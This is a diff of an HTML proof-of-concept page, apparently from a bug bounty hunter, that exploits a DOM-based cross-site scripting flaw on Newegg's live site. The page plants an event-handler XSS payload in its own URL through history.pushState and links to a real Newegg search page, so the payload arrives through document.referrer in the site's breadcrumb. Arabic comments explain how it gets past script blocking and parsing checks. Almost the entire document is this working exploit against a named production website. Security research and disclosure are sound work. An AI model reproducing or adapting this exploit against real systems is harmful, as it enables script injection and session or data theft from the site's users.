@@ -1,43 +1,29 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Newegg - Bug Bounty Mouad</title>
+    <title>PoC Mouad</title>
 </head>
-<body style="background:#111; color:#0f0; text-align:center; padding-top:100px; font-family:sans-serif;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <div style="border:2px solid #e67e22; display:inline-block; padding:30px; border-radius:15px; background:#1a1a1a;">
-        <h1 style="color:#e67e22;">Newegg DOM XSS Exploit</h1>
-        <p>Target: <code>breadcrumb -> document.referrer</code></p>
-        <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
-        
-        <a id="attack" href="#" style="padding:15px 30px; background:#e67e22; color:white; text-decoration:none; font-weight:bold; border-radius:5px; font-size:18px;">
-            تفعيل الثغرة الآن (Trigger)
-        </a>
-    </div>
+    <h1>Newegg DOM Analysis</h1>
+    <a id="attackBtn" href="#" style="padding:20px; background:orange; color:white; text-decoration:none; border-radius:10px;">
+        Click to Trigger 🚀
+    </a>
 
     <script>
-        /**
-         * التحليل التقني المعتمد على سجلاتك:
-         * 1. الموقع يكسر الـ JSON إذا وجد رموزاً معينة في غير مكانها.
-         * 2. نستخدم onmouseover لأن Osano قد يحجب <script> تلقائياً.
-         * 3. نستخدم /v/ لضمان عدم تعطل دالة الـ reduce في السطر 386.
-         */
+        // سنستخدم Payload لا يحتوي على مسافات أو رموز تكسر الـ JSON parse
+        // نستخدم `onmouseenter` بدلاً من `onmouseover` لتجنب التكرار
+        var xss = '"><b/onmouseenter=alert(document.domain)>MOUAD';
         
-        // الـ Payload: نغلق الـ href، ثم نفتح الوسم، ثم نحقن حدث الماوس
-        var payload = '"><mark onmouseover="alert(`XSS_MOUAD_DOMAIN:_`+document.domain)" style="color:red;cursor:pointer;padding:5px;">HACKED_BY_MOUAD</mark>';
-        
-        // بناء المسار بعناية ليتناسب مع هيكل الـ Breadcrumb المتوقع في Newegg
-        var targetPath = "/VORTEX/test/v/" + payload + "/";
+        // بناء مسار بسيط جداً لكي لا يكسر دالة split أو reduce
+        var cleanPath = "/VORTEX/" + encodeURIComponent(xss);
 
-        // تغيير العنوان في المتصفح (يعمل في GitHub لأن Origin ليس null)
-        window.history.pushState({}, '', targetPath);
+        // تغيير العنوان
+        window.history.pushState({}, '', cleanPath);
 
-        // ربط الزر بصفحة Newegg المستهدفة
-        document.getElementById('attack').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
-
-        console.log("Exploit Ready! Referrer will be: " + window.location.href);
+        // الانتقال للموقع
+        document.getElementById('attackBtn').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
     </script>
-
 </body>
 </html>
